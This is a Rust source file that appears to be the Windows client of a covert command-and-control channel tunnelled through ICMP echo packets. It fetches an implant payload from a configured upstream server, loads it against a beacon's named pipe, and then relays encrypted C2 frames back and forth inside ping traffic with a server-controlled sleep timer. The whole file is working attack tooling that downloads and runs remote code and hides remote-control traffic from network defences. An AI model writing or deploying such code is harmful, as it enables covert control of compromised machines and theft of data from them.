use anyhow::{anyhow, Result};
use covert_c2_ping_common::{Arch, PingMessage};
use covert_client::{self, CSFrameRead, CSFrameWrite, Implant};
use covert_common::CovertChannel;
use rand::random;
use std::{ffi::c_void, net::Ipv4Addr, slice, str::FromStr, thread, time::Duration};
use windows::{
    core::Error as WinError,
    Win32::{
        Foundation::GetLastError,
        NetworkManagement::IpHelper::{
            icmp_echo_reply, IcmpCloseHandle, IcmpCreateFile, IcmpSendEcho,
        },
    },
};

fn main() {
    let addr = Ipv4Addr::from_str(env!(
        "SERVER_IP",
        "Set the upstream ip env (SERVER_IP) in dotted decimal, or hostname"
    ))
    .unwrap()
    .octets();
    let id: u16 = random();
    let mut chan: CovertChannel<PingMessage, 4> = CovertChannel::new(key_from_string(env!("KEY","The common encryption key")));
    let implant = get_implant(&mut chan, id, addr);
    start_loop(&mut chan, id, addr, implant);
}

fn get_implant(chan: &mut CovertChannel<PingMessage, 4>, id: u16, addr: [u8; 4]) -> Implant {
    let arch = if cfg!(target_arch = "x86_64") {
        Arch::X86_64
    } else {
        Arch::i686
    };
    chan.put_message(
        PingMessage::InitMessage(arch, env!("PIPE_NAME","The pipe name to connect to the beacon").to_owned()),
        id,
    );
    match get_ping_message(
        chan,
        id,
        Duration::from_secs(env!("SLEEP", "Initial sleep timer").parse().unwrap()),
        addr,
    ) {
        PingMessage::DataMessage(data) => {
            return covert_client::create_implant_from_buf(data, env!("PIPE_NAME","The pipe name to connect to the beacon")).unwrap();
            //Failed to create implant
        }
        _ => panic!(""), //Bad First Message
    };
}

fn start_loop(
    chan: &mut CovertChannel<PingMessage, 4>,
    id: u16,
    addr: [u8; 4],
    mut implant: Implant,
) -> ! {
    let out_data = implant.read_frame().unwrap();
    chan.put_message(PingMessage::DataMessage(out_data), id);
    let mut sleep_time = Duration::from_secs(env!("SLEEP", "Initial sleep timer").parse().unwrap());
    loop {
        let message = get_ping_message(chan, id, sleep_time, addr);
        match message {
            PingMessage::DataMessage(data) => {
                implant.write_frame(data).unwrap();
                let out_data = implant.read_frame().unwrap();
                chan.put_message(PingMessage::DataMessage(out_data), id);
            }
            PingMessage::SleepMessage(new_time) => sleep_time = new_time,
            _ => {}
        };
    }
}



fn get_ping_message(
    chan: &mut CovertChannel<PingMessage, 4>,
    id: u16,
    sleep_time: Duration,
    addr: [u8; 4],
) -> PingMessage {
    loop {
        thread::sleep(sleep_time);
        let packet = chan.get_packet(id);

        let message = send_ping(addr, packet)
            .and_then(|data| {
                chan.put_packet(data.as_slice()).or(Err(anyhow!(""))) //No Packets
            })
            .and_then(|(in_chan, ready)| {
                if in_chan == id && ready {
                    return chan.get_message(id).ok_or(anyhow!("")); //Failed to parse message
                }
                return Err(anyhow!("")); //Not ready yet
            });
        match message {
            Ok(out) => {
                // "Got message from upstream";
                return out;
            }
            Err(_) => {}
        }
    }
}

#[allow(dead_code)]
#[repr(C)]
struct ReplyBuffer {
    reply_data: icmp_echo_reply,
    buffer: [u8; 64],
}

fn send_ping(addr: [u8; 4], data: Vec<u8>) -> Result<Vec<u8>> {
    unsafe {
        let handle = IcmpCreateFile()?;
        let mut replybuffer: ReplyBuffer = std::mem::zeroed();
        let replysize: u32 = std::mem::size_of::<ReplyBuffer>().try_into().unwrap();
        let result = IcmpSendEcho(
            handle,
            u32::from_le_bytes(addr),
            data.as_ptr() as *const c_void,
            data.len().try_into().unwrap(),
            std::ptr::null(),
            &mut replybuffer as *mut _ as *mut c_void,
            replysize,
            10000,
        );
        IcmpCloseHandle(handle);
        if result > 1 {
            return Err(anyhow!("")); //"More than one response"
        } else if result == 0 {
            return Err(anyhow!(WinError::from(GetLastError())));
        }
        let response_data = slice::from_raw_parts(
            replybuffer.reply_data.Data as *const u8,
            replybuffer.reply_data.DataSize.try_into().unwrap(),
        );
        return Ok(response_data.to_vec());
    }
}

fn key_from_string(key: &str) -> [u8; 32] {
    let key_string = key.as_bytes();
    let truncated = if key_string.len() > 32 {
        &key_string[..32]
    } else {
        key_string
    };
    let mut key_vec = truncated.to_vec();
    if key_vec.len() < 32 {
        key_vec.append(&mut vec![0u8; 32 - key_vec.len()]);
    }
    return key_vec.try_into().unwrap(); //"Could not make array"
}
